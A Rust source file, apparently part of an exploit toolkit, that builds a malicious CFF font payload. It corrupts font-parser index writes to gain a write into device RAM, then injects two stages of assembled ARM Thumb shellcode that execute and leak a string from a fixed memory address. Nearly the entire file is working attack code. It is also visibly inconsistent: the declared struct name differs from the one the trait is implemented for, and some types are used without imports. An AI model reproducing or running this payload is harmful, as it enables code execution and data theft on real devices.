use capstone::{arch, Capstone};
use capstone::arch::BuildsCapstone;
use crate::cringestone::ThumbAsm;
use crate::payload::{CffPayloadBuilder, Payload};
use crate::payload::exploit_config::ExploitConfig;

#[derive(Default)]
pub struct StringLeakPayload {}

impl Payload for InitialCodeExecPayload {
    fn build_cff<Cfg: ExploitConfig>(&self, b: &mut CffPayloadBuilder) {
        // Lets make sure we have lots of space
        // Not fully needed but should help with blind reliability
        b.index_write(Cfg::OFFSET_BUILDCHAR_LEN_PTR, i32::MAX as u32);

        // Set our write target to start of ram
        b.index_write(Cfg::OFFSET_BUILDCHAR_PTR, 0x0800_0000_u32);


        // Stage 2
        {
            let mut tmp = Vec::new();

            use keystone_engine::Keystone;
            let engine =
                Keystone::new(Arch::ARM, Mode::THUMB).expect("Could not initialize Keystone engine");

            const CODE: &'static str = r#"

 push {r2-r7, lr}
 ldr r2, data_byte_addr

 adr r5, counter
 ldr r4, [r5]
 adds r4, #1
 str r4, [r5]
 subs r4, #9
 bge leak
 b exit

 leak:
 eors r4, r4
 str r4, [r5]
 adr r5, tgt_addr

 ldr r6, [r5] @ get tgt addr
 ldrb r7, [r6] @ read byte from tgt

 @ Write data byte
 strb r7, [r2]

 @ Inc tgt addr
 adds r6, #1
 str r6, [r5]

 @ Check for null
 subs r7, #0
 beq exit

 @ Not null, write a second byte
 ldrb r7, [r6] @ read byte from tgt

 @ Write data byte
 adds r2, #1
 strb r7, [r2]

 @ Inc tgt addr
 adds r6, #1
 str r6, [r5]

 @ Check for null
 subs r7, #0
 beq exit

 @ Not null, write a third byte
 ldrb r7, [r6] @ read byte from tgt

 @ Write data byte
 adds r2, #1
 strb r7, [r2]

 @ Inc tgt addr
 adds r6, #1
 str r6, [r5]

 @ Check for null
 subs r7, #0
 beq exit

 @ Not null, write a forth byte
 ldrb r7, [r6] @ read byte from tgt

 @ Write data byte
 adds r2, #1
 strb r7, [r2]

 @ Inc tgt addr
 adds r6, #1
 str r6, [r5]

 @ Check for null
 subs r7, #0
 beq exit

 @ Not null, write a fifth byte
 ldrb r7, [r6] @ read byte from tgt

 @ Write data byte
 adds r2, #1
 strb r7, [r2]

 @ Inc tgt addr
 adds r6, #1
 str r6, [r5]

 @ Check for null
 subs r7, #0
 beq exit

 @ Not null, write a sixth byte
 ldrb r7, [r6] @ read byte from tgt

 @ Write data byte
 adds r2, #1
 strb r7, [r2]

 @ Inc tgt addr
 adds r6, #1
 str r6, [r5]

 @ Check for null
 subs r7, #0
 beq exit

 @ Not null, write a seventh byte
 ldrb r7, [r6] @ read byte from tgt

 @ Write data byte
 adds r2, #1
 strb r7, [r2]

 @ Inc tgt addr
 adds r6, #1
 str r6, [r5]

 @ Check for null
 subs r7, #0
 beq exit

 @ Not null, write a eighth byte
 ldrb r7, [r6] @ read byte from tgt

 @ Write data byte
 adds r2, #1
 strb r7, [r2]

 @ Inc tgt addr
 adds r6, #1
 str r6, [r5]

 @ Check for null
 subs r7, #0
 beq exit

 @ Not null, write a ninth byte
 ldrb r7, [r6] @ read byte from tgt

 @ Write data byte
 adds r2, #1
 strb r7, [r2]

 @ Inc tgt addr
 adds r6, #1
 str r6, [r5]

 @ Check for null
 subs r7, #0
 beq exit

 @ Not null, write a tenth byte
 ldrb r7, [r6] @ read byte from tgt

 @ Write data byte
 adds r2, #1
 strb r7, [r2]

 @ Inc tgt addr
 adds r6, #1
 str r6, [r5]

 @ Check for null
 subs r7, #0
 beq exit

 @ Not null, write a eleventh byte
 ldrb r7, [r6] @ read byte from tgt

 @ Write data byte
 adds r2, #1
 strb r7, [r2]

 @ Inc tgt addr
 adds r6, #1
 str r6, [r5]

 exit:
 pop {r2-r7, pc}

 .align 4
 tgt_addr:
 .word 0x0800cd60
 counter:
 .word 0x0
 data_byte_addr:
 .word 0x08001321
 "#;

            let result = engine
                .asm(CODE.to_string(), 0)
                .expect("Could not assemble");

            println!("Stage 2 size = {}", result.bytes.len());


            tmp.extend_from_slice(&result.bytes);

            for (i, x) in result.bytes.chunks(4).enumerate() {
                println!("{:08x} {:02x?}", 0x0800_0000 + i * 4, x);
            }


            {
                let cs = Capstone::new()
                    .arm()
                    .mode(arch::arm::ArchMode::Thumb)
                    .detail(true)
                    .build()
                    .expect("Failed to create Capstone object");

                let insns = cs.disasm_all(&tmp, 0x0800_0000)
                    .expect("Failed to disassemble");

                for i in insns.as_ref() {
                    println!("{}", i);
                }
            }

            for (idx, t) in tmp.chunks(4).enumerate() {
                let mut tmp = [0u8, 0, 0, 0];
                tmp[..t.len()].copy_from_slice(t);

                b.index_write_array(idx as u16, tmp);
            }
        }


        // Stage 1
        {
            let mut tmp = Vec::new();

            use keystone_engine::Keystone;
            let engine =
                Keystone::new(Arch::ARM, Mode::THUMB).expect("Could not initialize Keystone engine");

            const CODE: &'static str = r#"
push {r1, lr}
ldr r1, =0x08000001
blx r1
pop {r1, pc}
"#;

            let result = engine
                .asm(CODE.to_string(), 0)
                .expect("Could not assemble");


            tmp.extend_from_slice(&result.bytes);

            for (i, x) in tmp.chunks(4).enumerate() {
                println!("{:08x} {:02x?}", 0x0800_0000 + i, x);
            }

            println!("----");

            for (i, x) in result.bytes.chunks(4).enumerate() {
                println!("{:08x} {:02x?}", 0x0800_0000 + 0x400 + i * 4, x);
            }

            {
                let cs = Capstone::new()
                    .arm()
                    .mode(arch::arm::ArchMode::Thumb)
                    .detail(true)
                    .build()
                    .expect("Failed to create Capstone object");

                let insns = cs.disasm_all(&result.bytes, 0x1000)
                    .expect("Failed to disassemble");

                for i in insns.as_ref() {
                    println!("{}", i);
                }
            }

            for (idx, t) in tmp.chunks(4).enumerate() {
                let mut tmp = [0u8, 0, 0, 0];
                tmp[..t.len()].copy_from_slice(t);

                b.index_write_array(idx as u16 + 0xc4 / 4, tmp);
            }
        }
    }
}